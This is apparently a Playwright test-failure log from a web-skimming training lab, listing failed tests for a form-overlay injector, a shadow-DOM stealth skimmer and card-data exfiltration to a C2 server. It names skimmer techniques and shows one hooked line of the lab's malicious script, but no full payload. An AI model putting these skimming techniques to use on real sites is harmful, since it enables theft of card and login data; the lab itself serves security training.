+    Error Context: test-results/tests-form-overlay-DOM-Bas-8ffa2-rlay-on-high-priority-forms-chromium/error-context.md
+
+  9) [chromium] › test/tests/form-overlay.spec.js:98:3 › DOM-Based Skimming Lab - Form Overlay Injection › should capture credentials through fake overlay 
+
+    Error: locator.isVisible: Error: strict mode violation: locator('#overlay-form input[name*="cvv"]') resolved to 4 elements:
+        1) <input name="cvv" type="text" required="" id="overlay_cvv" placeholder="123" class="overlay-input"/> aka getByRole('textbox', { name: 'CVV CVV CVV CVV' })
+        2) <input name="cvv" type="text" required="" id="overlay_cvv" placeholder="123" class="overlay-input"/> aka getByRole('textbox', { name: '123' }).nth(1)
+        3) <input name="cvv" type="text" required="" id="overlay_cvv" placeholder="123" class="overlay-input"/> aka getByRole('textbox', { name: '123' }).nth(2)
+        4) <input name="cvv" type="text" required="" id="overlay_cvv" placeholder="123" class="overlay-input"/> aka getByRole('textbox', { name: '123' }).nth(4)
+
+    Call log:
+    [2m    - checking visibility of locator('#overlay-form input[name*="cvv"]')[22m
+
+
+      139 |       }
+      140 |
+    > 141 |       if (await cvvField.isVisible()) {
+          |                          ^
+      142 |         await cvvField.fill('456')
+      143 |         console.log('💳 CVV entered in overlay')
+      144 |       }
+        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/form-overlay.spec.js:141:26
+
+    Error Context: test-results/tests-form-overlay-DOM-Bas-895a2-ntials-through-fake-overlay-chromium/error-context.md
+
+  10) [chromium] › test/tests/form-overlay.spec.js:201:3 › DOM-Based Skimming Lab - Form Overlay Injection › should show appropriate overlay for different form types 
+
+    Error: [2mexpect([22m[31mreceived[39m[2m).[22mtoContain[2m([22m[32mexpected[39m[2m) // indexOf[22m
+
+    Expected substring: [32m"Security"[39m
+    Received string:    [31m"⚠️ Transaction Verification"[39m
+
+      232 |
+      233 |         // Verify contextual content
+    > 234 |         expect(overlayTitle).toContain('Security')
+          |                              ^
+      235 |
+      236 |         // Close overlay for next test
+      237 |         await page.click('.overlay-close')
+        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/form-overlay.spec.js:234:30
+
+    Error Context: test-results/tests-form-overlay-DOM-Bas-6b024-ay-for-different-form-types-chromium/error-context.md
+
+  11) [chromium] › test/tests/form-overlay.spec.js:247:3 › DOM-Based Skimming Lab - Form Overlay Injection › should handle overlay persistence and anti-removal 
+
+    [31mTest timeout of 8000ms exceeded.[39m
+
+    Error: page.waitForTimeout: Test timeout of 8000ms exceeded.
+
+      276 |
+      277 |       // Wait for persistence mechanism to re-inject
+    > 278 |       await page.waitForTimeout(3000)
+          |                  ^
+      279 |
+      280 |       // Check if overlay was re-injected
+      281 |       overlayVisible = await page.locator('#form-overlay-backdrop').isVisible()
+        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/form-overlay.spec.js:278:18
+
+    Error Context: test-results/tests-form-overlay-DOM-Bas-c9754-ersistence-and-anti-removal-chromium/error-context.md
+
+  12) [chromium] › test/tests/form-overlay.spec.js:371:3 › DOM-Based Skimming Lab - Form Overlay Injection › should handle overlay cancellation and closure 
+
+    [31mTest timeout of 8000ms exceeded.[39m
+
+    Error: page.waitForTimeout: Test timeout of 8000ms exceeded.
+
+      417 |       })
+      418 |       await page.click('[data-section="cards"]')
+    > 419 |       await page.waitForTimeout(3000)
+          |                  ^
+      420 |
+      421 |       // Test cancel button
+      422 |       const cancelButton = page.locator('.overlay-cancel')
+        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/form-overlay.spec.js:419:18
+
+    Error Context: test-results/tests-form-overlay-DOM-Bas-cbcc6-ay-cancellation-and-closure-chromium/error-context.md
+
+  13) [chromium] › test/tests/lab2-improvements.spec.js:105:3 › Lab 2: DOM-Based Skimming - UI Improvements › should show add new card form by default on cards page 
+
+    Error: [2mexpect([22m[31mlocator[39m[2m).[22mtoBeVisible[2m()[22m failed
+
+    Locator:  locator('#card-account-password')
+    Expected: visible
+    Received: <element(s) not found>
+    Timeout:  5000ms
+
+    Call log:
+    [2m  - Expect "toBeVisible" with timeout 5000ms[22m
+    [2m  - waiting for locator('#card-account-password')[22m
+
+
+      140 |
+      141 |     const cardPasswordField = page.locator('#card-account-password')
+    > 142 |     await expect(cardPasswordField).toBeVisible()
+          |                                     ^
+      143 |
+      144 |     // Check that first field has focus (waiting for user input)
+      145 |     const focusedElement = await page.evaluate(() => document.activeElement?.id)
+        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/lab2-improvements.spec.js:142:37
+
+    Error Context: test-results/tests-lab2-improvements-La-3f7f0-rm-by-default-on-cards-page-chromium/error-context.md
+
+  14) [chromium] › test/tests/lab2-improvements.spec.js:150:3 › Lab 2: DOM-Based Skimming - UI Improvements › should have add new card form waiting for user input 
+
+    Error: [2mexpect([22m[31mlocator[39m[2m).[22mtoHaveValue[2m([22m[32mexpected[39m[2m)[22m failed
+
+    Locator: locator('#card-account-password')
+    Expected string: [32m""[39m
+    Received: <element(s) not found>
+    Timeout: 5000ms
+
+    Call log:
+    [2m  - Expect "toHaveValue" with timeout 5000ms[22m
+    [2m  - waiting for locator('#card-account-password')[22m
+
+
+      169 |     await expect(page.locator('#card-cvv-input')).toHaveValue('')
+      170 |     await expect(page.locator('#card-billing-zip')).toHaveValue('')
+    > 171 |     await expect(page.locator('#card-account-password')).toHaveValue('')
+          |                                                          ^
+      172 |
+      173 |     // Test that we can type in the focused field
+      174 |     await cardNumberField.type('4111')
+        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/lab2-improvements.spec.js:171:58
+
+    Error Context: test-results/tests-lab2-improvements-La-70983-form-waiting-for-user-input-chromium/error-context.md
+
+  15) [chromium] › test/tests/lab2-improvements.spec.js:206:3 › Lab 2: DOM-Based Skimming - UI Improvements › should have fewer features and focus on cc-input page 
+
+    Error: [2mexpect([22m[31mlocator[39m[2m).[22mtoBeVisible[2m()[22m failed
+
+    Locator:  locator('#card-account-password')
+    Expected: visible
+    Received: <element(s) not found>
+    Timeout:  5000ms
+
+    Call log:
+    [2m  - Expect "toBeVisible" with timeout 5000ms[22m
+    [2m  - waiting for locator('#card-account-password')[22m
+
+
+      235 |     for (const fieldSelector of ccFields) {
+      236 |       const field = page.locator(fieldSelector)
+    > 237 |       await expect(field).toBeVisible()
+          |                           ^
+      238 |     }
+      239 |
+      240 |     console.log('✅ Interface is simplified and focused on credit card input')
+        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/lab2-improvements.spec.js:237:27
+
+    Error Context: test-results/tests-lab2-improvements-La-0b417--and-focus-on-cc-input-page-chromium/error-context.md
+
+  16) [chromium] › test/tests/shadow-skimmer.spec.js:104:3 › DOM-Based Skimming Lab - Shadow DOM Stealth Attack › should monitor fields across shadow boundaries 
+
+    [31mTest timeout of 8000ms exceeded.[39m
+
+    Error: page.fill: Test timeout of 8000ms exceeded.
+    Call log:
+    [2m  - waiting for locator('#transfer-password')[22m
+
+
+      125 |     await page.fill('#to-account', '123456789')
+      126 |     await page.fill('#transfer-amount', '2500.00')
+    > 127 |     await page.fill('#transfer-password', 'shadowtest123')
+          |                ^
+      128 |
+      129 |     // Add a small delay between fields to trigger monitoring
+      130 |     await page.waitForTimeout(500)
+        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/shadow-skimmer.spec.js:127:16
+
+    Error Context: test-results/tests-shadow-skimmer-DOM-B-deff6-ds-across-shadow-boundaries-chromium/error-context.md
+
+  17) [chromium] › test/tests/shadow-skimmer.spec.js:166:3 › DOM-Based Skimming Lab - Shadow DOM Stealth Attack › should handle closed shadow DOM stealth 
+
+    Error: page.evaluate: TypeError: Failed to execute 'getComputedStyle' on 'Window': parameter 1 is not of type 'Element'.
+
+       at ../malicious-code/shadow-skimmer.js:608
+
+      606 |           }
+      607 |         }
+    > 608 |         return originalGetComputedStyle.apply(this, arguments)
+          |                                         ^
+      609 |       }
+      610 |     })
+      611 |
+        at window.getComputedStyle (./malicious-code/shadow-skimmer.js:608:41)
+        at window.getComputedStyle (./malicious-code/shadow-skimmer.js:608:41)
+        at window.getComputedStyle (./malicious-code/shadow-skimmer.js:608:41)
+        at window.getComputedStyle (./malicious-code/shadow-skimmer.js:608:41)
+        at window.getComputedStyle (./malicious-code/shadow-skimmer.js:608:41)
+        at eval (eval at evaluate (:291:30), <anonymous>:4:32)
+        at Array.map (<anonymous>)
+        at eval (eval at evaluate (:291:30), <anonymous>:2:22)
+        at UtilityScript.evaluate (<anonymous>:293:16)
+        at UtilityScript.<anonymous> (<anonymous>:1:44)
+        at window.getComputedStyle (./malicious-code/shadow-skimmer.js:608:41)
+        at window.getComputedStyle (./malicious-code/shadow-skimmer.js:608:41)
+        at window.getComputedStyle (./malicious-code/shadow-skimmer.js:608:41)
+        at window.getComputedStyle (./malicious-code/shadow-skimmer.js:608:41)
+        at window.getComputedStyle (./malicious-code/shadow-skimmer.js:608:41)
+        at eval (eval at evaluate (:291:30), <anonymous>:4:32)
+        at eval (eval at evaluate (:291:30), <anonymous>:2:22)
+        at UtilityScript.evaluate (<anonymous>:293:16)
+        at UtilityScript.<anonymous> (<anonymous>:1:44)
+        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/shadow-skimmer.spec.js:225:41
+
+    Error Context: test-results/tests-shadow-skimmer-DOM-B-40a95-e-closed-shadow-DOM-stealth-chromium/error-context.md
+
+  18) [chromium] › test/tests/shadow-skimmer.spec.js:249:3 › DOM-Based Skimming Lab - Shadow DOM Stealth Attack › should capture data through shadow isolation 
+
+    [31mTest timeout of 8000ms exceeded.[39m
+
+    Error: page.click: Test timeout of 8000ms exceeded.
+    Call log:
+    [2m  - waiting for locator('button:has-text("Change PIN")')[22m
+    [2m    - locator resolved to <button class="action-btn" onclick="showPasswordPrompt('pin')">Change PIN</button>[22m
+    [2m  - attempting click action[22m
+    [2m    2 × waiting for element to be visible, enabled and stable[22m
+    [2m      - element is not visible[22m
+    [2m    - retrying click action[22m
+    [2m    - waiting 20ms[22m
+    [2m    2 × waiting for element to be visible, enabled and stable[22m
+    [2m      - element is not visible[22m
+    [2m    - retrying click action[22m
+    [2m      - waiting 100ms[22m
+    [2m    5 × waiting for element to be visible, enabled and stable[22m
+    [2m      - element is not visible[22m
+    [2m    - retrying click action[22m
+    [2m      - waiting 500ms[22m
+
+
+      278 |
+      279 |     // Trigger card action for password/CVV fields
+    > 280 |     await page.click('button:has-text("Change PIN")')
+          |                ^
+      281 |     await page.waitForTimeout(500)
+      282 |
+      283 |     console.log('🔐 Filling sensitive fields for shadow capture...')
+        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/shadow-skimmer.spec.js:280:16
+
+    Error Context: test-results/tests-shadow-skimmer-DOM-B-b64ef-ta-through-shadow-isolation-chromium/error-context.md
+
+  19) [chromium] › test/tests/shadow-skimmer.spec.js:442:3 › DOM-Based Skimming Lab - Shadow DOM Stealth Attack › should handle nested shadow DOM structures 
+
+    [31mTest timeout of 8000ms exceeded.[39m
+
+    Error: page.click: Test timeout of 8000ms exceeded.
+    Call log:
+    [2m  - waiting for locator('[data-section="settings"]')[22m
+
+
+      477 |
+      478 |     // Test cross-shadow monitoring with nested structure
+    > 479 |     await page.click('[data-section="settings"]')
+          |                ^
+      480 |     await page.waitForTimeout(1000)
+      481 |
+      482 |     // Fill fields to test monitoring across nested shadows
+        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/shadow-skimmer.spec.js:479:16
+
+    Error Context: test-results/tests-shadow-skimmer-DOM-B-0f60f-ested-shadow-DOM-structures-chromium/error-context.md
+
+  20) [chromium] › test/tests/shadow-skimmer.spec.js:568:3 › DOM-Based Skimming Lab - Shadow DOM Stealth Attack › should handle page unload with shadow cleanup 
+
+    [31mTest timeout of 8000ms exceeded.[39m
+
+    Error: page.fill: Test timeout of 8000ms exceeded.
+    Call log:
+    [2m  - waiting for locator('#transfer-password')[22m
+
+
+      580 |     // Generate some shadow activity
+      581 |     await page.click('[data-section="transfer"]')
+    > 582 |     await page.fill('#transfer-password', 'unloadtest')
+          |                ^
+      583 |     await page.waitForTimeout(1000)
+      584 |
+      585 |     // Get shadow data before unload
+        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/shadow-skimmer.spec.js:582:16
+
+    Error Context: test-results/tests-shadow-skimmer-DOM-B-78054--unload-with-shadow-cleanup-chromium/error-context.md
+
+  20 failed
+    [chromium] › test/tests/cc-exfiltration.spec.js:39:3 › Lab 2: DOM-Based Skimming - Credit Card Exfiltration › should enter CC information and verify C2 server shows exfiltrated data 
+    [chromium] › test/tests/dom-monitor.spec.js:49:3 › DOM-Based Skimming Lab - Real-Time Field Monitor › should monitor DOM mutations and attach to new forms 
+    [chromium] › test/tests/dom-monitor.spec.js:109:3 › DOM-Based Skimming Lab - Real-Time Field Monitor › should capture keystrokes in real-time 
+    [chromium] › test/tests/dom-monitor.spec.js:174:3 › DOM-Based Skimming Lab - Real-Time Field Monitor › should detect and monitor dynamically added forms 
+    [chromium] › test/tests/dom-monitor.spec.js:240:3 › DOM-Based Skimming Lab - Real-Time Field Monitor › should handle high-value field immediate exfiltration 
+    [chromium] › test/tests/dom-monitor.spec.js:318:3 › DOM-Based Skimming Lab - Real-Time Field Monitor › should contain DOM monitoring attack patterns 
+    [chromium] › test/tests/dom-monitor.spec.js:368:3 › DOM-Based Skimming Lab - Real-Time Field Monitor › should handle page unload data exfiltration 
+    [chromium] › test/tests/form-overlay.spec.js:49:3 › DOM-Based Skimming Lab - Form Overlay Injection › should inject overlay on high-priority forms 
+    [chromium] › test/tests/form-overlay.spec.js:98:3 › DOM-Based Skimming Lab - Form Overlay Injection › should capture credentials through fake overlay 
+    [chromium] › test/tests/form-overlay.spec.js:201:3 › DOM-Based Skimming Lab - Form Overlay Injection › should show appropriate overlay for different form types 
+    [chromium] › test/tests/form-overlay.spec.js:247:3 › DOM-Based Skimming Lab - Form Overlay Injection › should handle overlay persistence and anti-removal 
+    [chromium] › test/tests/form-overlay.spec.js:371:3 › DOM-Based Skimming Lab - Form Overlay Injection › should handle overlay cancellation and closure 
+    [chromium] › test/tests/lab2-improvements.spec.js:105:3 › Lab 2: DOM-Based Skimming - UI Improvements › should show add new card form by default on cards page 
+    [chromium] › test/tests/lab2-improvements.spec.js:150:3 › Lab 2: DOM-Based Skimming - UI Improvements › should have add new card form waiting for user input 
+    [chromium] › test/tests/lab2-improvements.spec.js:206:3 › Lab 2: DOM-Based Skimming - UI Improvements › should have fewer features and focus on cc-input page 
+    [chromium] › test/tests/shadow-skimmer.spec.js:104:3 › DOM-Based Skimming Lab - Shadow DOM Stealth Attack › should monitor fields across shadow boundaries 
+    [chromium] › test/tests/shadow-skimmer.spec.js:166:3 › DOM-Based Skimming Lab - Shadow DOM Stealth Attack › should handle closed shadow DOM stealth 
+    [chromium] › test/tests/shadow-skimmer.spec.js:249:3 › DOM-Based Skimming Lab - Shadow DOM Stealth Attack › should capture data through shadow isolation 
+    [chromium] › test/tests/shadow-skimmer.spec.js:442:3 › DOM-Based Skimming Lab - Shadow DOM Stealth Attack › should handle nested shadow DOM structures 
+    [chromium] › test/tests/shadow-skimmer.spec.js:568:3 › DOM-Based Skimming Lab - Shadow DOM Stealth Attack › should handle page unload with shadow cleanup 
+  10 passed (1.1m)
